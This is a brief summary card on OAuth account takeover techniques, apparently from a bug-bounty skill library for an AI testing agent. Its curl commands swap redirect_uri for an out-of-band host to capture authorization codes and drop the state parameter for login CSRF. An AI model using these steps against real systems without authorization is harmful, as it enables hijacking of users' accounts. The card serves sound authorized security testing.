# OAuth Account Takeover — Summary Card

**Phase:** 3 | **Type:** Authentication | **Impact:** Critical

## Quick Summary
Turn the OAuth/social-login flow into full account takeover. Five primitives: redirect_uri code theft, missing state (login CSRF / account linking), email-collision linking, token leakage (Referer/logs), and code replay + PKCE optionality. Deepens the base `oauth/` skill.

## Key Indicators
- Social login buttons (Google/GitHub/Facebook/SSO)
- `redirect_uri` / `state` / `code_challenge` in authorize requests
- Account-linking on email or profile attributes
- OAuth callback page loading external resources

## Quick Test
```bash
# 1. Redirect code theft — replace redirect_uri with your OOB URL
#    (complete the flow, watch for ?code= in OOB logs)
curl -i "https://target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=http://OOB_URL/cb"

# 2. State removal -> login CSRF
curl -i "https://target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://app.com/callback&scope=openid"

# 3. Replay: exchange the same code twice (should fail 2nd time)
```

## Critical Bounty Potential
- Full ATO via code theft = critical ($3,000-$15,000)
- Login CSRF account linking = ATO of any user who clicks
- Email-collision linking = persistent account control

## Token Cost
~4,500 tokens (Worker reads full SKILL.md + may load `oauth/attacks.md`)
